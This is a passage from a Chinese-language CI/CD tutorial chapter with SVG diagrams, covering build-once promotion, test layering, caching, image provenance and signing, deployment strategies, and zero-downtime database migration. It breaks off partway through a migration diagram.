DEEP({ 'cicd': `
<p>上一課畫出了管線的全貌，也列了幾條「能擋掉大多數災難」的規則。這一章把每條規則背後的機制拆開：為什麼一定要只建置一次；快取怎麼讓管線從二十分鐘變四分鐘；映像檔的「出處」怎麼證明；藍綠、金絲雀、功能開關在真實系統裡怎麼運作、各自會在哪裡出事；資料庫改欄位怎麼做到不停機又能退版；最後，為什麼管線本身是攻擊者最想拿下的目標，以及怎麼守。這一章的內容，就是「會寫 YAML」和「能負責整條上線流程」之間的差距。</p>

<h3><span class="badge lv1">基礎</span>一、管線是一條產線：只建置一次，一路往前推</h3>
<p>想像一間汽車工廠。一台車在產線上組好，經過品管檢驗、蓋章，再送到各地經銷商。沒有人會在每個經銷商那裡「照同一張設計圖重新組一台」，因為重組的那台沒有經過品管，誰也不能保證它跟檢驗過的那台一樣。</p>
<p>軟體也一樣。CI 建出來的映像檔（image）是那台車，staging 是品管，正式環境是經銷商。<b>只建置一次</b>（build once），然後把<b>同一個檔案</b>一路推過各個環境，這叫<b>晉升</b>（promote）。</p>
<figure class="figure"><svg viewBox="0 0 660 248" class="fg" style="width:100%;max-width:660px" role="img" aria-label="上半：同一個 commit 只建置一次，同一個 digest 送到 staging 和 prod；下半：每個環境各建一次，週一和週五建出來的 digest 不同，prod 跑的東西沒人測過">
<text x="12" y="22" class="fg-t acc">好：只建一次</text>
<rect x="20" y="34" width="120" height="44" rx="6" class="fg-b"/><text x="80" y="53" text-anchor="middle" class="fg-t">commit</text><text x="80" y="70" text-anchor="middle" class="fg-t sm mono">3f9c2e1</text>
<line x1="140" y1="56" x2="162" y2="56" class="fg-l"/><polygon points="170,56 162,51.5 162,60.5" class="fg-a"/>
<rect x="170" y="34" width="110" height="44" rx="6" class="fg-b"/><text x="225" y="61" text-anchor="middle" class="fg-t">建置＋測試</text>
<line x1="280" y1="56" x2="302" y2="56" class="fg-l"/><polygon points="310,56 302,51.5 302,60.5" class="fg-a"/>
<rect x="310" y="34" width="150" height="44" rx="6" class="fg-b hot"/><text x="385" y="53" text-anchor="middle" class="fg-t acc">映像檔</text><text x="385" y="70" text-anchor="middle" class="fg-t sm mono">sha256:a1f3…</text>
<path d="M460 56 H485 V43 H502" class="fg-l on"/><polygon points="510,43 502,38.5 502,47.5" class="fg-a on"/>
<path d="M485 56 V75 H502" class="fg-l on"/><polygon points="510,75 502,70.5 502,79.5" class="fg-a on"/>
<rect x="510" y="30" width="130" height="26" rx="5" class="fg-b"/><text x="575" y="48" text-anchor="middle" class="fg-t">staging</text>
<rect x="510" y="62" width="130" height="26" rx="5" class="fg-b hot"/><text x="575" y="80" text-anchor="middle" class="fg-t">prod</text>
<text x="400" y="104" text-anchor="middle" class="fg-t sm acc">staging 驗過的，就是 prod 跑的那一份</text>
<line x1="12" y1="118" x2="648" y2="118" class="fg-l dim dash"/>
<text x="12" y="140" class="fg-t warm">壞：每個環境各建一次</text>
<rect x="20" y="150" width="120" height="66" rx="6" class="fg-b"/><text x="80" y="178" text-anchor="middle" class="fg-t">commit</text><text x="80" y="196" text-anchor="middle" class="fg-t sm mono">3f9c2e1</text>
<line x1="140" y1="163" x2="162" y2="163" class="fg-l"/><polygon points="170,163 162,158.5 162,167.5" class="fg-a"/>
<line x1="140" y1="203" x2="162" y2="203" class="fg-l"/><polygon points="170,203 162,198.5 162,207.5" class="fg-a"/>
<rect x="170" y="150" width="130" height="26" rx="5" class="fg-b"/><text x="235" y="168" text-anchor="middle" class="fg-t sm">週一 staging 建置</text>
<rect x="170" y="190" width="130" height="26" rx="5" class="fg-b"/><text x="235" y="208" text-anchor="middle" class="fg-t sm">週五 prod 建置</text>
<line x1="300" y1="163" x2="322" y2="163" class="fg-l"/><polygon points="330,163 322,158.5 322,167.5" class="fg-a"/>
<line x1="300" y1="203" x2="322" y2="203" class="fg-l"/><polygon points="330,203 322,198.5 322,207.5" class="fg-a"/>
<rect x="330" y="150" width="140" height="26" rx="5" class="fg-b"/><text x="400" y="168" text-anchor="middle" class="fg-t sm mono">sha256:a1f3…</text>
<rect x="330" y="190" width="140" height="26" rx="5" class="fg-b warm"/><text x="400" y="208" text-anchor="middle" class="fg-t sm mono">sha256:9b27…</text>
<line x1="470" y1="163" x2="502" y2="163" class="fg-l"/><polygon points="510,163 502,158.5 502,167.5" class="fg-a"/>
<line x1="470" y1="203" x2="502" y2="203" class="fg-l warm"/><polygon points="510,203 502,198.5 502,207.5" class="fg-a warm"/>
<rect x="510" y="150" width="130" height="26" rx="5" class="fg-b"/><text x="575" y="168" text-anchor="middle" class="fg-t">staging</text>
<rect x="510" y="190" width="130" height="26" rx="5" class="fg-b warm"/><text x="575" y="208" text-anchor="middle" class="fg-t">prod</text>
<text x="330" y="238" text-anchor="middle" class="fg-t sm warm">同一個 commit，建出來卻不一樣：prod 跑的東西沒人測過</text>
</svg><figcaption>同一份原始碼，隔幾天再建一次，結果常常不一樣。只有把「檔案本身」往前推，staging 的測試結果才代表 prod。</figcaption></figure>
<p>同一個 commit 為什麼會建出不同的東西？常見的三個原因：</p>
<ul>
<li><b>基底映像檔換了</b>：<code>FROM node:22</code> 這個標籤會隨著官方發布修補版而移動，週一和週五拉到的可能是不同的 Node.js 修補版本。</li>
<li><b>套件版本浮動</b>：<code>package.json</code> 寫 <code>^1.4.0</code>，沒有鎖檔或建置時沒用 <code>npm ci</code>，就可能裝到 1.5.0。</li>
<li><b>建置時寫死的設定</b>：前端最常見。Vite 的 <code>import.meta.env.VITE_API_URL</code> 在建置時就被替換成字串，所以很多團隊為每個環境各建一次。</li>
</ul>
<p>第三點的解法是把設定從「建置時」搬到「執行時」：前端在啟動時先抓一份 <code>/config.json</code>，或由容器啟動腳本把環境變數寫進一個全域物件，打包檔本身不含任何環境相關的值。後端則由部署平台注入環境變數或 ConfigMap。<b>一個映像檔、多份設定</b>，這是 build once 能成立的前提。</p>

<h3><span class="badge lv1">基礎</span>二、測試金字塔：什麼測試放在管線的哪裡</h3>
<p>測試不是越多越好，而是要放在對的層級。最常用的模型是<b>測試金字塔</b>（test pyramid）：</p>
<figure class="figure"><svg viewBox="0 0 640 256" class="fg" style="width:100%;max-width:640px" role="img" aria-label="測試金字塔：底層是大量快速的單元測試，中層是整合測試，頂層是少量慢速的端對端測試，右邊列出各層的數量與速度">
<polygon points="220,20 274,80 166,80" class="fg-b warm"/>
<text x="220" y="70" text-anchor="middle" class="fg-t">端對端</text>
<polygon points="166,80 274,80 337,150 103,150" class="fg-b alt"/>
<text x="220" y="121" text-anchor="middle" class="fg-t">整合測試</text>
<polygon points="103,150 337,150 400,220 40,220" class="fg-b hot"/>
<text x="220" y="191" text-anchor="middle" class="fg-t acc">單元測試</text>
<text x="440" y="56" class="fg-t sm">幾個到幾十個</text>
<text x="440" y="72" class="fg-t sm warm">每個幾十秒以上，最容易不穩</text>
<text x="440" y="112" class="fg-t sm">幾十到幾百個</text>
<text x="440" y="128" class="fg-t sm">每個幾秒：真的資料庫、佇列</text>
<text x="440" y="182" class="fg-t sm">幾百到幾千個</text>
<text x="440" y="198" class="fg-t sm acc">每個幾毫秒：純邏輯</text>
<line x1="280" y1="64" x2="430" y2="64" class="fg-l dim dash"/>
<line x1="320" y1="120" x2="430" y2="120" class="fg-l dim dash"/>
<line x1="382" y1="190" x2="430" y2="190" class="fg-l dim dash"/>
<text x="320" y="246" text-anchor="middle" class="fg-t sm">往上：越慢、越貴、越像真實使用者　往下：越快、越便宜、越能精準指出哪裡壞</text>
</svg><figcaption>數量是常見的量級，不是規定。重點是形狀：大部分的信心來自底層又快又多的測試，頂層只留下幾條最重要的使用者流程。</figcaption></figure>
<ul>
<li><b>單元測試</b>（unit test）：測一個函式、一個類別，不碰網路和資料庫。猜高低遊戲裡「比大小、算分數、判斷平手」的邏輯就該在這層，跑一千個也只要幾秒。</li>
<li><b>整合測試</b>（integration test）：把你的程式和真的資料庫、真的 Redis 接起來測。CI 裡常用容器起一個臨時的 PostgreSQL（GitHub Actions 的 service container，或 Testcontainers 這類函式庫）。</li>
<li><b>端對端測試</b>（end-to-end test）：用 Playwright 這類工具開真的瀏覽器，從登入一路點到結算。最像真實使用者，但最慢、最容易因為時間差而偶爾失敗。</li>
</ul>
<h4>把管線排成「先便宜、後昂貴」</h4>
<p>管線的順序原則是<b>快速失敗</b>（fail fast）：越便宜、越常抓到錯的檢查放越前面。一條典型的管線：格式與 lint、型別檢查（TypeScript 的 <code>tsc --noEmit</code>）、單元測試，這幾步可以平行跑，一兩分鐘內結束；通過了才建置映像檔、跑整合測試；最後部署到 staging 跑少量端對端測試。整條管線最好控制在十分鐘左右，超過半小時，大家就會開始想辦法跳過它。</p>
<p>還有一種測試的敵人叫<b>不穩定測試</b>（flaky test）：同一份程式碼，有時過有時不過。它的傷害比看起來大，因為大家會學會「紅了就重跑」，真正的錯誤也跟著被重跑掉。對策是一發現就隔離（標記、移出必過的檢查）、開單修掉，而不是加自動重試把問題藏起來。</p>

<h3><span class="badge lv2">進階</span>三、快取：讓管線從二十分鐘變四分鐘</h3>
<p>CI 的執行環境通常每次都是全新的機器，什麼都沒有。沒有快取，每次都要重新下載幾百 MB 的套件、從頭建每一層映像檔。快取有兩種，原理一樣：<b>用輸入的雜湊當鑰匙，輸入沒變，就直接拿上次的結果</b>。</p>
<h4>第一種：套件快取</h4>
<pre><code>- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: npm-\${{ hashFiles('package-lock.json') }}
    restore-keys: npm-</code></pre>
<p>鑰匙裡放了鎖檔的雜湊（實務上常再加上作業系統名稱，避免不同作業系統的快取混在一起）。鎖檔沒變，鑰匙就一樣，直接還原；鎖檔變了，就用 <code>restore-keys</code> 找最接近的舊快取當起點，只補下載變動的部分。（實務上 <code>actions/setup-node</code> 加一行 <code>cache: npm</code> 就幫你做好了。）</p>
<h4>第二種：映像檔的分層快取</h4>
<p>Dockerfile 的每一行指令產生一層。建置時，Docker 從上往下檢查：這一行指令和它用到的檔案都跟上次一樣，就直接用快取；<b>某一層一旦變了，它下面的每一層都要重建</b>。所以指令的順序決定了快取的效果：</p>
<figure class="figure"><svg viewBox="0 0 660 250" class="fg" style="width:100%;max-width:660px" role="img" aria-label="只改一行原始碼時，先複製鎖檔再複製原始碼的 Dockerfile 只重建最後兩層，約 30 秒；先複製全部原始碼的 Dockerfile 從第二層起全部重建，約 2 分鐘">
<text x="20" y="28" class="fg-t acc">好：先複製鎖檔</text>
<rect x="20" y="44" width="200" height="28" rx="5" class="fg-b"/><text x="30" y="63" class="fg-t mono">FROM node:22-slim</text><text x="228" y="63" class="fg-t sm acc">命中</text>
<rect x="20" y="80" width="200" height="28" rx="5" class="fg-b"/><text x="30" y="99" class="fg-t mono">COPY package*.json ./</text><text x="228" y="99" class="fg-t sm acc">命中</text>
<rect x="20" y="116" width="200" height="28" rx="5" class="fg-b hot"/><text x="30" y="135" class="fg-t mono">RUN npm ci</text><text x="228" y="135" class="fg-t sm acc">命中，省 90 秒</text>
<rect x="20" y="152" width="200" height="28" rx="5" class="fg-b warm"/><text x="30" y="171" class="fg-t mono">COPY . .</text><text x="228" y="171" class="fg-t sm warm">重建</text>
<rect x="20" y="188" width="200" height="28" rx="5" class="fg-b warm"/><text x="30" y="207" class="fg-t mono">RUN npm run build</text><text x="228" y="207" class="fg-t sm warm">重建 30 秒</text>
<text x="170" y="240" text-anchor="middle" class="fg-t sm acc">合計約 30 秒</text>
<line x1="330" y1="16" x2="330" y2="244" class="fg-l dim dash"/>
<text x="350" y="28" class="fg-t warm">壞：先複製全部原始碼</text>
<rect x="350" y="44" width="200" height="28" rx="5" class="fg-b"/><text x="360" y="63" class="fg-t mono">FROM node:22-slim</text><text x="558" y="63" class="fg-t sm acc">命中</text>
<rect x="350" y="80" width="200" height="28" rx="5" class="fg-b warm"/><text x="360" y="99" class="fg-t mono">COPY . .</text><text x="558" y="99" class="fg-t sm warm">原始碼變了</text>
<rect x="350" y="116" width="200" height="28" rx="5" class="fg-b warm"/><text x="360" y="135" class="fg-t mono">RUN npm ci</text><text x="558" y="135" class="fg-t sm warm">重建 90 秒</text>
<rect x="350" y="152" width="200" height="28" rx="5" class="fg-b warm"/><text x="360" y="171" class="fg-t mono">RUN npm run build</text><text x="558" y="171" class="fg-t sm warm">重建 30 秒</text>
<line x1="340" y1="112" x2="340" y2="172" class="fg-l warm"/><polygon points="340,180 335.5,172 344.5,172" class="fg-a warm"/>
<text x="500" y="240" text-anchor="middle" class="fg-t sm warm">合計約 2 分鐘</text>
</svg><figcaption>同樣只改了一行原始碼。左邊因為鎖檔沒變，最貴的 <code>npm ci</code> 直接命中快取；右邊原始碼那一層一變，下面全部跟著重建。秒數是示意的量級。</figcaption></figure>
<p>CI 的機器每次都是新的，本機的分層快取帶不過去，要把快取存到外面。BuildKit 支援把快取匯出到映像檔倉庫或 CI 的快取服務：</p>
<pre><code>CACHE=ghcr.io/example/hilo-api:cache
docker buildx build \\
  --cache-from type=registry,ref=$CACHE \\
  --cache-to type=registry,ref=$CACHE,mode=max \\
  -t ghcr.io/example/hilo-api:3f9c2e1 --push .</code></pre>
<h4>快取的兩個風險</h4>
<ul>
<li><b>鑰匙設計錯</b>：鑰匙太寬（例如只用作業系統名稱），會拿到過期的東西，建出「本機正常、CI 壞掉」或反過來的結果；鑰匙太窄（例如含 commit ID），永遠不會命中。原則是：鑰匙必須包含所有會影響結果的輸入，而且只包含它們。</li>
<li><b>快取也是攻擊面</b>：下一次建置會信任快取的內容。誰能寫入快取，誰就能影響之後的建置。GitHub Actions 的快取會依分支隔離，PR 建出的快取不會被 main 讀到；如果你自己架快取或共用的建置機器，就要自己確保不受信任的程式碼寫不進主線會讀的快取。</li>
</ul>

<h3><span class="badge lv2">進階</span>四、版本與出處：這個映像檔到底是從哪裡來的</h3>
<p>上一課說用 commit ID 當標籤，不用 <code>latest</code>。再往下一層：<b>標籤（tag）本身也是可以移動的</b>。標籤只是一個指向某個映像檔的名字，有權限的人隨時可以把 <code>hilo-api:3f9c2e1</code> 改指向另一個映像檔。真正不會變的，是映像檔內容的雜湊，叫 <b>digest</b>：</p>
<pre><code># 標籤：給人看的名字，可以被改指向別的映像檔
ghcr.io/example/hilo-api:3f9c2e1
# digest：內容的雜湊，改一個位元組就不同
ghcr.io/example/hilo-api@sha256:7d1e9a…</code></pre>
<p>成熟的做法是：標籤用 commit ID（方便人對照），部署設定裡寫 digest（保證拿到的就是測過的那一份）。很多 GitOps 工具在更新映像檔時會自動把 digest 一起寫進去。</p>
<h4>出處證明：簽章、建置紀錄、SBOM</h4>
<p>digest 證明「內容沒被換過」，但不證明「這是我們的 CI 從我們的原始碼建出來的」。攻擊者如果拿到倉庫的推送權限，可以推一個自己的映像檔上去，它也有一個完美的 digest。所以還需要證明<b>出處</b>（provenance）：</p>
<ul>
<li><b>簽章</b>：Sigstore 的 cosign 可以做「免金鑰簽章」：CI 用自己的 OIDC 身分（第八節會講）向 Sigstore 換一張只活幾分鐘的憑證來簽，簽章紀錄寫進公開的透明日誌（Rekor）。驗證的人可以檢查「這是不是 <code>example/hilo</code> 這個 repo 的 main 分支上的工作流程簽的」。</li>
<li><b>建置紀錄</b>（build provenance attestation）：記錄這個映像檔是哪個 commit、哪個工作流程、在什麼環境建出來的。SLSA 這個框架把它分成幾個等級，等級越高，越難偽造。</li>
<li><b>SBOM</b>（software bill of materials，軟體物料清單）：列出映像檔裡每一個套件和版本。下一次又爆出一個像 Log4Shell 那樣的漏洞，你可以在幾分鐘內查出哪些服務中招，而不是一個一個翻。</li>
</ul>
<p>最後一步是<b>在部署時驗證</b>：Kubernetes 的准入控制（例如 Kyverno 的映像檔驗證規則）可以設定「沒有我們 CI 簽章的映像檔，一律不准跑」。只簽不驗，等於裝了門鎖卻從不上鎖。</p>

<h3><span class="badge lv3">專業</span>五、部署策略深入比較</h3>
<p>滾動更新在「健康檢查、資源、擴展與版本推出」那一課的深入圖解裡追過了：一批一批換，新舊版本並存一段時間。這一節看另外三種。</p>
<h4>藍綠部署：兩套完整環境，一次切換</h4>
<figure class="figure"><svg viewBox="0 0 660 216" class="fg" style="width:100%;max-width:660px" role="img" aria-label="藍綠部署：切換前負載平衡器把全部流量送到藍色 v1，綠色 v2 在暖機；切換後全部流量送到綠色 v2，藍色待命可切回；兩邊共用同一個資料庫">
<rect x="105" y="20" width="120" height="32" rx="6" class="fg-b"/><text x="165" y="41" text-anchor="middle" class="fg-t">負載平衡器</text>
<path d="M140 52 V76 H90 V92" class="fg-l alt"/><polygon points="90,100 85.5,92 94.5,92" class="fg-a alt"/>
<path d="M190 52 V76 H240 V92" class="fg-l dim dash"/><polygon points="240,100 235.5,92 244.5,92" class="fg-a"/>
<rect x="30" y="100" width="120" height="44" rx="6" class="fg-b alt"/><text x="90" y="119" text-anchor="middle" class="fg-t alt">藍 v1</text><text x="90" y="136" text-anchor="middle" class="fg-t sm">100% 流量</text>
<rect x="180" y="100" width="120" height="44" rx="6" class="fg-b dash"/><text x="240" y="119" text-anchor="middle" class="fg-t">綠 v2</text><text x="240" y="136" text-anchor="middle" class="fg-t sm">暖機、冒煙測試</text>
<line x1="235" y1="36" x2="427" y2="36" class="fg-l on"/><polygon points="435,36 427,31.5 427,40.5" class="fg-a on"/>
<text x="330" y="28" text-anchor="middle" class="fg-t sm acc">改一個設定，瞬間切換</text>
<rect x="435" y="20" width="120" height="32" rx="6" class="fg-b"/><text x="495" y="41" text-anchor="middle" class="fg-t">負載平衡器</text>
<path d="M470 52 V76 H420 V92" class="fg-l dim dash"/><polygon points="420,100 415.5,92 424.5,92" class="fg-a"/>
<path d="M520 52 V76 H570 V92" class="fg-l on"/><polygon points="570,100 565.5,92 574.5,92" class="fg-a on"/>
<rect x="360" y="100" width="120" height="44" rx="6" class="fg-b dash"/><text x="420" y="119" text-anchor="middle" class="fg-t">藍 v1</text><text x="420" y="136" text-anchor="middle" class="fg-t sm">待命，隨時切回</text>
<rect x="510" y="100" width="120" height="44" rx="6" class="fg-b hot"/><text x="570" y="119" text-anchor="middle" class="fg-t acc">綠 v2</text><text x="570" y="136" text-anchor="middle" class="fg-t sm">100% 流量</text>
<rect x="150" y="170" width="360" height="34" rx="6" class="fg-b warm"/><text x="330" y="192" text-anchor="middle" class="fg-t">同一個資料庫：結構必須新舊兩版都能用</text>
<path d="M90 144 V187 H150" class="fg-l dim"/><line x1="240" y1="144" x2="240" y2="170" class="fg-l dim"/>
<line x1="420" y1="144" x2="420" y2="170" class="fg-l dim"/><path d="M570 144 V187 H510" class="fg-l dim"/>
</svg><figcaption>左邊是切換前，右邊是切換後。流量一瞬間整批換過去，退版也是一瞬間切回來。真正難的部分在下面那個共用的資料庫。</figcaption></figure>
<p>切換的開關可以是負載平衡器的目標群組、Kubernetes Service 的 selector，或 DNS。DNS 最不建議，因為各地的快取要等 TTL 過期才會更新，「瞬間切換」會變成「幾分鐘到幾小時慢慢切」。藍綠的幾個坑：</p>
<ul>
<li><b>資料庫是共用的</b>：兩套程式碼同時對著同一個資料庫，切回藍色時，綠色寫進去的資料藍色也要看得懂。這要靠第六節的 expand-contract。</li>
<li><b>背景工作會跑兩份</b>：綠色一啟動，裡面的排程工作和佇列消費者也啟動了，還沒切流量，就已經在處理訊息、寄信。背景工作要另外控制，例如只有「現役」的那一套才啟用。</li>
<li><b>長連線不會自己搬家</b>：WebSocket 連線切換後還掛在藍色上，要等它們斷線重連，或主動通知用戶端重連。</li>
<li><b>成本</b>：切換期間要兩倍的機器。雲端上可以只在發布時開出綠色，切完確認穩定後再關掉藍色。</li>
</ul>
<h4>金絲雀發布與自動分析</h4>
<p>金絲雀（canary）把一小部分流量送到新版本，看數字，好就放大，壞就退回。重點是「看數字」這件事要交給機器，不要靠人盯儀表板。Argo Rollouts 或 Flagger 這類工具，每一階段都會去查 Prometheus 之類的監控，用你寫好的條件判斷：</p>
<figure class="figure"><svg viewBox="0 0 680 240" class="fg" style="width:100%;max-width:680px" role="img" aria-label="金絲雀流量比例隨時間階梯上升：5%、25%、50%、100%，每一階段結束前自動分析通過才放大；另一種結局是在第 16 分鐘分析失敗，自動退回 0%">
<line x1="80" y1="40" x2="80" y2="210" class="fg-l dim"/><line x1="80" y1="210" x2="640" y2="210" class="fg-l dim"/>
<text x="72" y="206" text-anchor="end" class="fg-t sm">5%</text><text x="72" y="174" text-anchor="end" class="fg-t sm">25%</text><text x="72" y="134" text-anchor="end" class="fg-t sm">50%</text><text x="72" y="54" text-anchor="end" class="fg-t sm">100%</text>
<text x="80" y="228" text-anchor="middle" class="fg-t sm">0</text><text x="220" y="228" text-anchor="middle" class="fg-t sm">10 分</text><text x="360" y="228" text-anchor="middle" class="fg-t sm">20 分</text><text x="500" y="228" text-anchor="middle" class="fg-t sm">30 分</text><text x="640" y="228" text-anchor="middle" class="fg-t sm">40 分</text>
<polyline points="80,202 220,202 220,170 360,170 360,130 500,130 500,50 640,50" class="fg-l on"/>
<circle cx="220" cy="186" r="5" class="fg-lamp on"/><text x="212" y="190" text-anchor="end" class="fg-t sm acc">分析通過</text>
<circle cx="360" cy="150" r="5" class="fg-lamp on"/><text x="352" y="154" text-anchor="end" class="fg-t sm acc">分析通過</text>
<circle cx="500" cy="90" r="5" class="fg-lamp on"/><text x="492" y="94" text-anchor="end" class="fg-t sm acc">分析通過</text>
<path d="M304 170 V208" class="fg-l warm dash"/><polygon points="304,210 299.5,202 308.5,202" class="fg-a warm"/>
<text x="312" y="196" class="fg-t sm warm">另一種結局：第 16 分鐘分析失敗，自動退回 0%</text>
<rect x="110" y="34" width="250" height="60" rx="6" class="fg-b"/>
<text x="122" y="54" class="fg-t acc">每一階段的自動分析</text>
<text x="122" y="72" class="fg-t sm">錯誤率 &lt; 1%，而且不比舊版差</text>
<text x="122" y="88" class="fg-t sm">p99 延遲 &lt; 300ms</text>
</svg><figcaption>綠線是送到新版本的流量比例。每一階就是一道關卡：條件不過，工具自動把流量切回舊版，不用等人醒來。門檻數字是示意。</figcaption></figure>
<p>金絲雀有一個常被忽略的數學問題：<b>流量太小，數字沒有意義</b>。算一次：</p>
<ul>
<li>服務每秒 200 個請求，金絲雀拿 5%，就是每秒 10 個。10 分鐘累積 6,000 個請求。舊版錯誤率 0.1%，預期 6 個錯誤；新版如果錯誤率變成 0.5%，會有 30 個。6 和 30，差得很清楚。</li>
<li>換成每秒 20 個請求的小服務，同樣 5%、10 分鐘，只有 600 個請求。0.1% 是 0.6 個錯誤，0.5% 是 3 個。出現 2 個錯誤，你根本分不出是運氣還是新版有問題。</li>
</ul>
<p>所以流量小的服務，要嘛拉長每一階段，要嘛提高比例，要嘛把舊版也切一組同樣大小的「基準組」（baseline）一起比，避免拿「整個舊版」和「一小撮新版」比較時被時段差異誤導。另外，同一個使用者最好固定落在同一個版本（用 cookie 或使用者 ID 分流），不然他一下看到新版、一下看到舊版，體驗和數據都會亂。</p>
<h4>功能開關：把「部署」和「發布」拆開</h4>
<p>前面三種策略切的都是「哪個版本的程式在跑」。功能開關（feature flag）切的是「程式裡哪段功能被打開」：新功能的程式碼早就部署上去了，只是預設關著。好處是發布變成改一個設定，退回也只要幾秒，不用重新部署。</p>
<p>按百分比開放時，不能每次請求都擲骰子，否則同一個人重新整理一下功能就不見了。標準做法是把「開關名稱 + 使用者 ID」做雜湊，取 0 到 99 的值，小於設定的百分比就打開。同一個人每次算出來都一樣，把百分比從 10 調到 30，原本看到的人也還在裡面。</p>
<p>代價是開關會越積越多。一個功能全面開放兩週後，就該把開關和舊的程式路徑一起刪掉。程式碼裡留著幾百個沒人敢刪的開關，每一個都是一條沒測過的分支。</p>
<table>
<tr><th>策略</th><th>退回要多久</th><th>額外成本</th><th>出事影響多少人</th><th>前提</th></tr>
<tr><td>滾動更新</td><td>幾分鐘（再滾一次）</td><td>很少</td><td>逐步擴大到全部</td><td>新舊版本能並存</td></tr>
<tr><td>藍綠</td><td>幾秒（切回去）</td><td>切換期間兩倍</td><td>切換那一刻是全部</td><td>能快速切換的入口</td></tr>
<tr><td>金絲雀</td><td>幾秒（自動）</td><td>需要好的監控</td><td>只有那一小部分</td><td>流量夠大、指標可靠</td></tr>
<tr><td>功能開關</td><td>幾秒（關掉）</td><td>程式碼裡的分支</td><td>可以只開給員工</td><td>開關系統、紀律刪除</td></tr>
</table>

<h3><span class="badge lv3">專業</span>六、資料庫遷移：expand-contract 一步一步</h3>
<p>上一課提過<b>先擴張、再收縮</b>（expand-contract，也叫平行變更 parallel change）。這裡用一個完整的例子走一次：猜高低的 <code>players</code> 表，要把 <code>name</code> 欄位改名成 <code>nickname</code>，全程不停機，而且每一步都能退。</p>
<figure class="figure"><svg viewBox="0 0 690 262" class="fg" style="width:100%;max-width:690px" role="img" aria-label="欄位改名的七個階段：起點、擴張加新欄位、程式雙寫、回填舊資料、切換讀取、停寫舊欄、收縮刪舊欄；前六步都能退回，最後一步不可逆">
<text x="12" y="74" class="fg-t">資料表</text>
<text x="12" y="150" class="fg-t">程式</text>
<text x="12" y="214" class="fg-t">能不能退</text>
<text x="129" y="28" text-anchor="middle" class="fg-t">起點</text><text x="213" y="28" text-anchor="middle" class="fg-t">擴張</text><text x="297" y="28" text-anchor="middle" class="fg-t">雙寫</text><text x="381" y="28" text-anchor="middle" class="fg-t">回填</text><text x="465" y="28" text-anchor="middle" class="fg-t">切換讀取</text><text x="549" y="28" text-anchor="middle" class="fg-t">停寫舊欄</text><text x="633" y="28" text-anchor="middle" class="fg-t warm">收縮</text>
<rect x="90" y="40" width="78" height="60" rx="6" class="fg-b"/><rect x="96" y="46" width="66" height="20" rx="4" class="fg-b alt"/><text x="129" y="60" text-anchor="middle" class="fg-t sm">name</text>
<rect x="174" y="40" width="78" height="60" rx="6" class="fg-b"/><rect x="180" y="46" width="66" height="20" rx="4" class="fg-b alt"/><text x="213" y="60" text-anchor="middle" class="fg-t sm">name</text><rect x="180" y="72" width="66" height="20" rx="4" class="fg-b dash"/><text x="213" y="86" text-anchor="middle" class="fg-t sm">nickname</text>
<rect x="258" y="40" width="78" height="60" rx="6" class="fg-b"/><rect x="264" y="46" width="66" height="20" rx="4" class="fg-b alt"/><text x="297" y="60" text-anchor="middle" class="fg-t sm">name</text><rect x="264" y="72" width="66" height="20" rx="4" class="fg-b dash"/><text x="297" y="86" text-anchor="middle" class="fg-t sm">nickname</text>
<rect x="342" y="40" width="78" height="60" rx="6" class="fg-b"/><rect x="348" y="46" width="66" height="20" rx="4" class="fg-b alt"/><text x="381" y="60" text-anchor="middle" class="fg-t sm">name</text><rect x="348" y="72" width="66" height="20" rx="4" class="fg-b hot"/><text x="381" y="86" text-anchor="middle" class="fg-t sm">nickname</text>
<rect x="426" y="40" width="78" height="60" rx="6" class="fg-b"/><rect x="432" y="46" width="66" height="20" rx="4" class="fg-b alt"/><text x="465" y="60" text-anchor="middle" class="fg-t sm">name</text><rect x="432" y="72" width="66" height="20" rx="4" class="fg-b hot"/><text x="465" y="86" text-anchor="middle" class="fg-t sm">nickname</text>
<rect x="510" y="40" width="78" height="60" rx="6" class="fg-b"/><rect x="516" y="46" width="66" height="20" rx="4" class="fg-b alt"/><text x="549" y="60" text-anchor="middle" class="fg-t sm">name</text><rect x="516" y="72" width="66" height="20" rx="4" class="fg-b hot"/><text x="549" y="86" text-anchor="middle" class="fg-t sm">nickname</text>
<rect x="594" y="40" width="78" height="60" rx="6" class="fg-b"/><rect x="600" y="72" width="66" height="20" rx="4" class="fg-b hot"/><text x="633" y="86" text-anchor="middle" class="fg-t sm">nickname</text>
<rect x="90" y="118" width="78" height="60" rx="6" class="fg-b"/><text x="129" y="136" text-anchor="middle" class="fg-t">v1</text><text x="129" y="152" text-anchor="middle" class="fg-t sm">讀 name</text><text x="129" y="168" text-anchor="middle" class="fg-t sm">寫 name</text>
<rect x="174" y="118" width="78" height="60" rx="6" class="fg-b"/><text x="213" y="136" text-anchor="middle" class="fg-t">v1</text><text x="213" y="152" text-anchor="middle" class="fg-t sm">讀 name</text><text x="213" y="168" text-anchor="middle" class="fg-t sm">寫 name</text>
<rect x="258" y="118" width="78" height="60" rx="6" class="fg-b alt"/><text x="297" y="136" text-anchor="middle" class="fg-t">v2</text><text x="297" y="152" text-anchor="middle" class="fg-t sm">讀 name</text><text x="297" y="168" text-anchor="middle" class="fg-t sm">寫兩個</text>
<rect x="342" y="118" width="78" height="60" rx="6" class="fg-b alt"/><text x="381" y="136" text-anchor="middle" class="fg-t">v2</text><text x="381" y="152" text-anchor="middle" class="fg-t sm">背景分批</text><text x="381" y="168" text-anchor="middle" class="fg-t sm">補舊資料</text>
<rect x="426" y="118" width="78" height="60" rx="6" class="fg-b hot"/><text x="465" y="136" text-anchor="middle" class="fg-t">v3</text><text x="465" y="152" text-anchor="middle" class="fg-t sm">讀 nickname</text><text x="465" y="168" text-anchor="middle" class="fg-t sm">寫兩個</text>
<rect x="510" y="118" width="78" height="60" rx="6" class="fg-b hot"/><text x="549" y="136" text-anchor="middle" class="fg-t">v4</text><text x="549" y="152" text-anchor="middle" class="fg-t sm">讀 nickname</text><text x="549" y="168" text-anchor="middle" class="fg-t sm">只寫新欄</text>
<rect x="594" y="118" width="78" height="60" rx="6" class="fg-b hot"/><text x="633" y="136" text-anchor="middle" class="fg-t">v4</text><text x="633" y="152" text-anchor="middle" class="fg-t sm">讀 nickname</text><text x="633" y="168" text-anchor="middle" class="fg-t sm">只寫新欄</text>
